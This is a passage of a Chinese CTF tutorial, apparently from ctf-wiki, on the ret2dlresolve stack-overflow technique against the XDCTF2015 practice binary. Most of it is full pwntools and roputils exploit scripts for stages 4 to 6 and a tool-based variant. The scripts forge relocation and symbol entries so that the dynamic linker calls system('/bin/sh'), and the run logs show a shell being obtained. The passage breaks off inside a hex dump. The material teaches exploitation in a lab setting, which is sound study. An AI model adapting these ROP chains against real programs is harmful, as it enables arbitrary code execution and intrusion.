class=\"line\">rop.raw(plt0)</span><br><span class=\"line\">rop.raw(index_offset)</span><br><span class=\"line\"><span class=\"comment\">## fake ret addr of write</span></span><br><span class=\"line\">rop.raw(<span class=\"string\">&#x27;bbbb&#x27;</span>)</span><br><span class=\"line\">rop.raw(<span class=\"number\">1</span>)</span><br><span class=\"line\">rop.raw(base_stage + <span class=\"number\">80</span>)</span><br><span class=\"line\">rop.raw(<span class=\"built_in\">len</span>(sh))</span><br><span class=\"line\">rop.raw(fake_write_reloc)  <span class=\"comment\"># fake write reloc</span></span><br><span class=\"line\">rop.raw(<span class=\"string\">&#x27;a&#x27;</span> * align)  <span class=\"comment\"># padding</span></span><br><span class=\"line\">rop.raw(fake_write_sym)  <span class=\"comment\"># fake write symbol</span></span><br><span class=\"line\">rop.raw(<span class=\"string\">&#x27;a&#x27;</span> * (<span class=\"number\">80</span> - <span class=\"built_in\">len</span>(rop.chain())))</span><br><span class=\"line\">rop.raw(sh)</span><br><span class=\"line\">rop.raw(<span class=\"string\">&#x27;a&#x27;</span> * (<span class=\"number\">100</span> - <span class=\"built_in\">len</span>(rop.chain())))</span><br><span class=\"line\">r.sendline(rop.chain())</span><br><span class=\"line\">r.interactive()</span><br></pre></td></tr></table></figure>\n\n<p>具体效果如下</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">➜  ret2dlresolve git:(master) ✗ python stage4.py</span><br><span class=\"line\">[*] &#x27;/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/stackoverflow/example/ret2dlresolve/main&#x27;</span><br><span class=\"line\">    Arch:     i386-32-little</span><br><span class=\"line\">    RELRO:    Partial RELRO</span><br><span class=\"line\">    Stack:    No canary found</span><br><span class=\"line\">    NX:       NX enabled</span><br><span class=\"line\">    PIE:      No PIE (0x8048000)</span><br><span class=\"line\">[+] Starting local process &#x27;./main&#x27;: pid 128795</span><br><span class=\"line\">[*] Loaded cached gadgets for &#x27;./main&#x27;</span><br><span class=\"line\">[*] Switching to interactive mode</span><br><span class=\"line\">/bin/sh[*] Got EOF while reading in interactive</span><br></pre></td></tr></table></figure>\n\n<p><strong>stage 5</strong></p>\n<p>这一阶段，我们将在阶段4的基础上，我们进一步使得write符号的st_name指向我们自己构造的字符串。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">elf = ELF(<span class=\"string\">&#x27;main&#x27;</span>)</span><br><span class=\"line\">r = process(<span class=\"string\">&#x27;./main&#x27;</span>)</span><br><span class=\"line\">rop = ROP(<span class=\"string\">&#x27;./main&#x27;</span>)</span><br><span class=\"line\">offset = <span class=\"number\">112</span></span><br><span class=\"line\">bss_addr = elf.bss()</span><br><span class=\"line\">r.recvuntil(<span class=\"string\">&#x27;Welcome to XDCTF2015~!\\n&#x27;</span>)</span><br><span class=\"line\"><span class=\"comment\">## stack privot to bss segment</span></span><br><span class=\"line\"><span class=\"comment\">## new stack size is 0x800</span></span><br><span class=\"line\">stack_size = <span class=\"number\">0x800</span></span><br><span class=\"line\">base_stage = bss_addr + stack_size</span><br><span class=\"line\"><span class=\"comment\">### padding</span></span><br><span class=\"line\">rop.raw(<span class=\"string\">&#x27;a&#x27;</span> * offset)</span><br><span class=\"line\"><span class=\"comment\">### read 100 byte to base_stage</span></span><br><span class=\"line\">rop.read(<span class=\"number\">0</span>, base_stage, <span class=\"number\">100</span>)</span><br><span class=\"line\"><span class=\"comment\">### stack privot, set esp = base_stage</span></span><br><span class=\"line\">rop.migrate(base_stage)</span><br><span class=\"line\">r.sendline(rop.chain())</span><br><span class=\"line\"><span class=\"comment\">## write sh=&quot;/bin/sh&quot;</span></span><br><span class=\"line\">rop = ROP(<span class=\"string\">&#x27;./main&#x27;</span>)</span><br><span class=\"line\">sh = <span class=\"string\">&quot;/bin/sh&quot;</span></span><br><span class=\"line\">plt0 = elf.get_section_by_name(<span class=\"string\">&#x27;.plt&#x27;</span>).header.sh_addr</span><br><span class=\"line\">rel_plt = elf.get_section_by_name(<span class=\"string\">&#x27;.rel.plt&#x27;</span>).header.sh_addr</span><br><span class=\"line\">dynsym = elf.get_section_by_name(<span class=\"string\">&#x27;.dynsym&#x27;</span>).header.sh_addr</span><br><span class=\"line\">dynstr = elf.get_section_by_name(<span class=\"string\">&#x27;.dynstr&#x27;</span>).header.sh_addr</span><br><span class=\"line\"><span class=\"comment\">### making fake write symbol</span></span><br><span class=\"line\">fake_sym_addr = base_stage + <span class=\"number\">32</span></span><br><span class=\"line\">align = <span class=\"number\">0x10</span> - ((fake_sym_addr - dynsym) &amp; <span class=\"number\">0xf</span></span><br><span class=\"line\">                )  <span class=\"comment\"># since the size of item(Elf32_Symbol) of dynsym is 0x10</span></span><br><span class=\"line\">fake_sym_addr = fake_sym_addr + align</span><br><span class=\"line\">index_dynsym = (</span><br><span class=\"line\">    fake_sym_addr - dynsym) / <span class=\"number\">0x10</span>  <span class=\"comment\"># calculate the dynsym index of write</span></span><br><span class=\"line\"><span class=\"comment\">## plus 10 since the size of Elf32_Sym is 16.</span></span><br><span class=\"line\">st_name = fake_sym_addr + <span class=\"number\">0x10</span> - dynstr</span><br><span class=\"line\">fake_write_sym = flat([st_name, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0x12</span>])</span><br><span class=\"line\"><span class=\"comment\">### making fake write relocation</span></span><br><span class=\"line\"><span class=\"comment\">## making base_stage+24 ---&gt; fake reloc</span></span><br><span class=\"line\">index_offset = base_stage + <span class=\"number\">24</span> - rel_plt</span><br><span class=\"line\">write_got = elf.got[<span class=\"string\">&#x27;write&#x27;</span>]</span><br><span class=\"line\">r_info = (index_dynsym &lt;&lt; <span class=\"number\">8</span>) | <span class=\"number\">0x7</span></span><br><span class=\"line\">fake_write_reloc = flat([write_got, r_info])</span><br><span class=\"line\">rop.raw(plt0)</span><br><span class=\"line\">rop.raw(index_offset)</span><br><span class=\"line\"><span class=\"comment\">## fake ret addr of write</span></span><br><span class=\"line\">rop.raw(<span class=\"string\">&#x27;bbbb&#x27;</span>)</span><br><span class=\"line\">rop.raw(<span class=\"number\">1</span>)</span><br><span class=\"line\">rop.raw(base_stage + <span class=\"number\">80</span>)</span><br><span class=\"line\">rop.raw(<span class=\"built_in\">len</span>(sh))</span><br><span class=\"line\">rop.raw(fake_write_reloc)  <span class=\"comment\"># fake write reloc</span></span><br><span class=\"line\">rop.raw(<span class=\"string\">&#x27;a&#x27;</span> * align)  <span class=\"comment\"># padding</span></span><br><span class=\"line\">rop.raw(fake_write_sym)  <span class=\"comment\"># fake write symbol</span></span><br><span class=\"line\">rop.raw(<span class=\"string\">&#x27;write\\x00&#x27;</span>)  <span class=\"comment\"># there must be a \\x00 to mark the end of string</span></span><br><span class=\"line\">rop.raw(<span class=\"string\">&#x27;a&#x27;</span> * (<span class=\"number\">80</span> - <span class=\"built_in\">len</span>(rop.chain())))</span><br><span class=\"line\">rop.raw(sh)</span><br><span class=\"line\">rop.raw(<span class=\"string\">&#x27;a&#x27;</span> * (<span class=\"number\">100</span> - <span class=\"built_in\">len</span>(rop.chain())))</span><br><span class=\"line\">r.sendline(rop.chain())</span><br><span class=\"line\">r.interactive()</span><br></pre></td></tr></table></figure>\n\n<p>效果如下</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">➜  ret2dlresolve git:(master) ✗ python stage5.py      </span><br><span class=\"line\">[*] &#x27;/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/stackoverflow/example/ret2dlresolve/main&#x27;</span><br><span class=\"line\">    Arch:     i386-32-little</span><br><span class=\"line\">    RELRO:    Partial RELRO</span><br><span class=\"line\">    Stack:    No canary found</span><br><span class=\"line\">    NX:       NX enabled</span><br><span class=\"line\">    PIE:      No PIE (0x8048000)</span><br><span class=\"line\">[+] Starting local process &#x27;./main&#x27;: pid 129249</span><br><span class=\"line\">[*] Loaded cached gadgets for &#x27;./main&#x27;</span><br><span class=\"line\">[*] Switching to interactive mode</span><br><span class=\"line\">/bin/sh[*] Got EOF while reading in interactive</span><br></pre></td></tr></table></figure>\n\n<p><strong>stage 6</strong></p>\n<p>这一阶段，我们只需要将原先的write字符串修改为system字符串，同时修改write的参数为system的参数即可获取shell。这是因为，dl_resolve最终依赖的是我们所给定的字符串，即使我们给了一个假的字符串它仍然会去解析并执行。具体代码如下</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">elf = ELF(<span class=\"string\">&#x27;main&#x27;</span>)</span><br><span class=\"line\">r = process(<span class=\"string\">&#x27;./main&#x27;</span>)</span><br><span class=\"line\">rop = ROP(<span class=\"string\">&#x27;./main&#x27;</span>)</span><br><span class=\"line\">offset = <span class=\"number\">112</span></span><br><span class=\"line\">bss_addr = elf.bss()</span><br><span class=\"line\">r.recvuntil(<span class=\"string\">&#x27;Welcome to XDCTF2015~!\\n&#x27;</span>)</span><br><span class=\"line\"><span class=\"comment\">## stack privot to bss segment</span></span><br><span class=\"line\"><span class=\"comment\">## new stack size is 0x800</span></span><br><span class=\"line\">stack_size = <span class=\"number\">0x800</span></span><br><span class=\"line\">base_stage = bss_addr + stack_size</span><br><span class=\"line\"><span class=\"comment\">### padding</span></span><br><span class=\"line\">rop.raw(<span class=\"string\">&#x27;a&#x27;</span> * offset)</span><br><span class=\"line\"><span class=\"comment\">### read 100 byte to base_stage</span></span><br><span class=\"line\">rop.read(<span class=\"number\">0</span>, base_stage, <span class=\"number\">100</span>)</span><br><span class=\"line\"><span class=\"comment\">### stack privot, set esp = base_stage</span></span><br><span class=\"line\">rop.migrate(base_stage)</span><br><span class=\"line\">r.sendline(rop.chain())</span><br><span class=\"line\"><span class=\"comment\">## write sh=&quot;/bin/sh&quot;</span></span><br><span class=\"line\">rop = ROP(<span class=\"string\">&#x27;./main&#x27;</span>)</span><br><span class=\"line\">sh = <span class=\"string\">&quot;/bin/sh&quot;</span></span><br><span class=\"line\">plt0 = elf.get_section_by_name(<span class=\"string\">&#x27;.plt&#x27;</span>).header.sh_addr</span><br><span class=\"line\">rel_plt = elf.get_section_by_name(<span class=\"string\">&#x27;.rel.plt&#x27;</span>).header.sh_addr</span><br><span class=\"line\">dynsym = elf.get_section_by_name(<span class=\"string\">&#x27;.dynsym&#x27;</span>).header.sh_addr</span><br><span class=\"line\">dynstr = elf.get_section_by_name(<span class=\"string\">&#x27;.dynstr&#x27;</span>).header.sh_addr</span><br><span class=\"line\"><span class=\"comment\">### making fake write symbol</span></span><br><span class=\"line\">fake_sym_addr = base_stage + <span class=\"number\">32</span></span><br><span class=\"line\">align = <span class=\"number\">0x10</span> - ((fake_sym_addr - dynsym) &amp; <span class=\"number\">0xf</span></span><br><span class=\"line\">                )  <span class=\"comment\"># since the size of item(Elf32_Symbol) of dynsym is 0x10</span></span><br><span class=\"line\">fake_sym_addr = fake_sym_addr + align</span><br><span class=\"line\">index_dynsym = (</span><br><span class=\"line\">    fake_sym_addr - dynsym) / <span class=\"number\">0x10</span>  <span class=\"comment\"># calculate the dynsym index of write</span></span><br><span class=\"line\"><span class=\"comment\">## plus 10 since the size of Elf32_Sym is 16.</span></span><br><span class=\"line\">st_name = fake_sym_addr + <span class=\"number\">0x10</span> - dynstr</span><br><span class=\"line\">fake_write_sym = flat([st_name, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0x12</span>])</span><br><span class=\"line\"><span class=\"comment\">### making fake write relocation</span></span><br><span class=\"line\"><span class=\"comment\">## making base_stage+24 ---&gt; fake reloc</span></span><br><span class=\"line\">index_offset = base_stage + <span class=\"number\">24</span> - rel_plt</span><br><span class=\"line\">write_got = elf.got[<span class=\"string\">&#x27;write&#x27;</span>]</span><br><span class=\"line\">r_info = (index_dynsym &lt;&lt; <span class=\"number\">8</span>) | <span class=\"number\">0x7</span></span><br><span class=\"line\">fake_write_reloc = flat([write_got, r_info])</span><br><span class=\"line\">rop.raw(plt0)</span><br><span class=\"line\">rop.raw(index_offset)</span><br><span class=\"line\"><span class=\"comment\">## fake ret addr of write</span></span><br><span class=\"line\">rop.raw(<span class=\"string\">&#x27;bbbb&#x27;</span>)</span><br><span class=\"line\">rop.raw(base_stage + <span class=\"number\">82</span>)</span><br><span class=\"line\">rop.raw(<span class=\"string\">&#x27;bbbb&#x27;</span>)</span><br><span class=\"line\">rop.raw(<span class=\"string\">&#x27;bbbb&#x27;</span>)</span><br><span class=\"line\">rop.raw(fake_write_reloc)  <span class=\"comment\"># fake write reloc</span></span><br><span class=\"line\">rop.raw(<span class=\"string\">&#x27;a&#x27;</span> * align)  <span class=\"comment\"># padding</span></span><br><span class=\"line\">rop.raw(fake_write_sym)  <span class=\"comment\"># fake write symbol</span></span><br><span class=\"line\">rop.raw(<span class=\"string\">&#x27;system\\x00&#x27;</span>)  <span class=\"comment\"># there must be a \\x00 to mark the end of string</span></span><br><span class=\"line\">rop.raw(<span class=\"string\">&#x27;a&#x27;</span> * (<span class=\"number\">80</span> - <span class=\"built_in\">len</span>(rop.chain())))</span><br><span class=\"line\"><span class=\"built_in\">print</span> rop.dump()</span><br><span class=\"line\"><span class=\"built_in\">print</span> <span class=\"built_in\">len</span>(rop.chain())</span><br><span class=\"line\">rop.raw(sh + <span class=\"string\">&#x27;\\x00&#x27;</span>)</span><br><span class=\"line\">rop.raw(<span class=\"string\">&#x27;a&#x27;</span> * (<span class=\"number\">100</span> - <span class=\"built_in\">len</span>(rop.chain())))</span><br><span class=\"line\">r.sendline(rop.chain())</span><br><span class=\"line\">r.interactive()</span><br></pre></td></tr></table></figure>\n\n<p>需要注意的是，这里我’/bin/sh’的偏移我修改为了82，这是因为pwntools中它会自动帮你对齐字符串。。。下面这一行说明了问题。</p>\n<p>0x0050:      ‘aara’</p>\n<p>效果如下</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">➜  ret2dlresolve git:(master) ✗ python stage6.py</span><br><span class=\"line\">[*] <span class=\"string\">&#x27;/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/stackoverflow/example/ret2dlresolve/main&#x27;</span></span><br><span class=\"line\">    Arch:     i386-<span class=\"number\">32</span>-little</span><br><span class=\"line\">    RELRO:    Partial RELRO</span><br><span class=\"line\">    Stack:    No canary found</span><br><span class=\"line\">    NX:       NX enabled</span><br><span class=\"line\">    PIE:      No PIE (<span class=\"number\">0x8048000</span>)</span><br><span class=\"line\">[+] Starting local process <span class=\"string\">&#x27;./main&#x27;</span>: pid <span class=\"number\">130415</span></span><br><span class=\"line\">[*] Loaded cached gadgets <span class=\"keyword\">for</span> <span class=\"string\">&#x27;./main&#x27;</span></span><br><span class=\"line\"><span class=\"number\">0x0000</span>:        <span class=\"number\">0x8048380</span></span><br><span class=\"line\"><span class=\"number\">0x0004</span>:           <span class=\"number\">0x2528</span></span><br><span class=\"line\"><span class=\"number\">0x0008</span>:           <span class=\"string\">&#x27;bbbb&#x27;</span> <span class=\"string\">&#x27;bbbb&#x27;</span></span><br><span class=\"line\"><span class=\"number\">0x000c</span>:        <span class=\"number\">0x804a892</span></span><br><span class=\"line\"><span class=\"number\">0x0010</span>:           <span class=\"string\">&#x27;bbbb&#x27;</span> <span class=\"string\">&#x27;bbbb&#x27;</span></span><br><span class=\"line\"><span class=\"number\">0x0014</span>:           <span class=\"string\">&#x27;bbbb&#x27;</span> <span class=\"string\">&#x27;bbbb&#x27;</span></span><br><span class=\"line\"><span class=\"number\">0x0018</span>: <span class=\"string\">&#x27;\\x1c\\xa0\\x04\\x08&#x27;</span> <span class=\"string\">&#x27;\\x1c\\xa0\\x04\\x08\\x07i\\x02\\x00&#x27;</span></span><br><span class=\"line\"><span class=\"number\">0x001c</span>:  <span class=\"string\">&#x27;\\x07i\\x02\\x00&#x27;</span></span><br><span class=\"line\"><span class=\"number\">0x0020</span>:           <span class=\"string\">&#x27;aaaa&#x27;</span> <span class=\"string\">&#x27;aaaaaaaa&#x27;</span></span><br><span class=\"line\"><span class=\"number\">0x0024</span>:           <span class=\"string\">&#x27;aaaa&#x27;</span></span><br><span class=\"line\"><span class=\"number\">0x0028</span>:  <span class=\"string\">&#x27;\\x00&amp;\\x00\\x00&#x27;</span> <span class=\"string\">&#x27;\\x00&amp;\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x12\\x00\\x00\\x00&#x27;</span></span><br><span class=\"line\"><span class=\"number\">0x002c</span>: <span class=\"string\">&#x27;\\x00\\x00\\x00\\x00&#x27;</span></span><br><span class=\"line\"><span class=\"number\">0x0030</span>: <span class=\"string\">&#x27;\\x00\\x00\\x00\\x00&#x27;</span></span><br><span class=\"line\"><span class=\"number\">0x0034</span>: <span class=\"string\">&#x27;\\x12\\x00\\x00\\x00&#x27;</span></span><br><span class=\"line\"><span class=\"number\">0x0038</span>:           <span class=\"string\">&#x27;syst&#x27;</span> <span class=\"string\">&#x27;system\\x00&#x27;</span></span><br><span class=\"line\"><span class=\"number\">0x003c</span>:        <span class=\"string\">&#x27;em\\x00o&#x27;</span></span><br><span class=\"line\"><span class=\"number\">0x0040</span>:             <span class=\"string\">&#x27;aa&#x27;</span></span><br><span class=\"line\"><span class=\"number\">0x0044</span>:           <span class=\"string\">&#x27;aaaa&#x27;</span> <span class=\"string\">&#x27;aaaaaaaaaaaaaa&#x27;</span></span><br><span class=\"line\"><span class=\"number\">0x0048</span>:           <span class=\"string\">&#x27;aaaa&#x27;</span></span><br><span class=\"line\"><span class=\"number\">0x004c</span>:           <span class=\"string\">&#x27;aaaa&#x27;</span></span><br><span class=\"line\"><span class=\"number\">0x0050</span>:           <span class=\"string\">&#x27;aara&#x27;</span></span><br><span class=\"line\"><span class=\"number\">82</span></span><br><span class=\"line\">[*] Switching to interactive mode</span><br><span class=\"line\">/<span class=\"built_in\">bin</span>/sh: <span class=\"number\">1</span>: xa: <span class=\"keyword\">not</span> found</span><br><span class=\"line\">$ ls</span><br><span class=\"line\">core  main.c     stage2.py  stage4.py  stage6.py</span><br><span class=\"line\">main  stage1.py  stage3.py  stage5.py</span><br></pre></td></tr></table></figure>\n\n<p><strong>工具攻击</strong></p>\n<p>根据上面的介绍，我们应该很容易可以理解这个攻击了。下面我们直接使用roputil来进行攻击。代码如下</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> roputils <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> process</span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> gdb</span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> context</span><br><span class=\"line\">r = process(<span class=\"string\">&#x27;./main&#x27;</span>)</span><br><span class=\"line\">context.log_level = <span class=\"string\">&#x27;debug&#x27;</span></span><br><span class=\"line\">r.recv()</span><br><span class=\"line\">rop = ROP(<span class=\"string\">&#x27;./main&#x27;</span>)</span><br><span class=\"line\">offset = <span class=\"number\">112</span></span><br><span class=\"line\">bss_base = rop.section(<span class=\"string\">&#x27;.bss&#x27;</span>)</span><br><span class=\"line\">buf = rop.fill(offset)</span><br><span class=\"line\">buf += rop.call(<span class=\"string\">&#x27;read&#x27;</span>, <span class=\"number\">0</span>, bss_base, <span class=\"number\">100</span>)</span><br><span class=\"line\"><span class=\"comment\">## used to call dl_Resolve()</span></span><br><span class=\"line\">buf += rop.dl_resolve_call(bss_base + <span class=\"number\">20</span>, bss_base)</span><br><span class=\"line\">r.send(buf)</span><br><span class=\"line\">buf = rop.string(<span class=\"string\">&#x27;/bin/sh&#x27;</span>)</span><br><span class=\"line\">buf += rop.fill(<span class=\"number\">20</span>, buf)</span><br><span class=\"line\"><span class=\"comment\">## used to make faking data, such relocation, Symbol, Str</span></span><br><span class=\"line\">buf += rop.dl_resolve_data(bss_base + <span class=\"number\">20</span>, <span class=\"string\">&#x27;system&#x27;</span>)</span><br><span class=\"line\">buf += rop.fill(<span class=\"number\">100</span>, buf)</span><br><span class=\"line\">r.send(buf)</span><br><span class=\"line\">r.interactive()</span><br></pre></td></tr></table></figure>\n\n<p>关于dl_resolve_call与dl_resolve_data的具体细节请参考roputils.py的源码，比较容易理解，需要注意的是，dl_resolve执行完之后也是需要有对应的返回地址的。</p>\n<p>效果如下</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">➜  ret2dlresolve git:(master) ✗ python roptool.py                       </span><br><span class=\"line\">[+] Starting local process &#x27;./main&#x27;: pid 6114</span><br><span class=\"line\">[DEBUG] Received 0x17 bytes:</span><br><span class=\"line\">    &#x27;Welcome to XDCTF2015~!\\n&#x27;</span><br><span class=\"line\">[DEBUG] Sent 0x94 bytes:</span><br><span class=\"line\">    00000000  46 4c 68 78  52 36 67 6e  65 47 53 58  71 77 51 49  │FLhx│R6gn│eGSX│qwQI│</span><br><span class=\"line\">    00000010  32 43 6c 49  77 76 51 33  47 49 4a 59  50 74 6c 38  │2ClI│wvQ3│GIJY│Ptl8│</span><br><span class=\"line\">    00000020  57 54 68 4a  63 48 39 62  46 55 52 58  50 73 38 64  │WThJ│cH9b│FURX│Ps8d│</span><br><span class=\"line\">    00000030  72 4c 38 63  50 79 37 73  55 45 7a 32  6f 59 5a 42  │rL8c│Py7s│UEz2│oYZB│</span><br><span class=\"line\">    00000040  76 59 32 43  74 75 77 6f  70 56 61 44  6a 73 35 6b  │vY2C│tuwo│pVaD│js5k│</span><br><span class=\"line\">    00000050  41 77 78 77  49 72 7a 49  70 4d 31 67  52 6f 44 6f  │Awxw│IrzI│pM1g│RoDo│</span><br><span class=\"line\">    00000060  43 44 43 6e  45 31 50 48  53 73 64 30  6d 54 7a 5a  │CDCn│E1PH│Ssd0│mTzZ│</span><br><span class=\"line\">    00000070  a0 83 04 08  19 86 04 08  00 00 00 00  40 a0 04 08  │····│····│····│@···│</span><br><span class=\"line\">    00000080  64 00 00 00  80 83 04 08  28 1d 00 00  79 83 04 08  │d···│····│(···│y···│</span><br><span class=\"line\">    00000090  40 a0 04 08                                         │@···││</span><br><span class=\"line\">    00000094</span><br><span class=\"line\">[DEBUG] Sent 0x64 bytes:</span><br><span class=\"line\">    00000000  2f 62 69 6e  2f 73 68 00  73 52 46 66  57 43 59 52  │/bin│/sh·│sRFf│WCYR│</span><br><span class=\"line\">    00000010  66 4c 35 52  78 49 4c 53  54 a0 04 08  07 e9 01 00  │fL5R│xILS│T···│····│</span><br><span class=\"line\">    00000020  6e 6b 45 32  52 76 73 6c  00 1e 00 00  00 00 00 00  │nkE2│Rvsl│····│····│</span><br><span class=\"line\">    00000030  00 00 00 00  12 00 00 00  73 79 73 74  65 6d 00 74  │····│····│syst│em·t│</span><br><span class=\"line\">    00000040  5a 4f 4e 6c  6c 73 4b 5a  76 53 48 6e  38 37 49 47  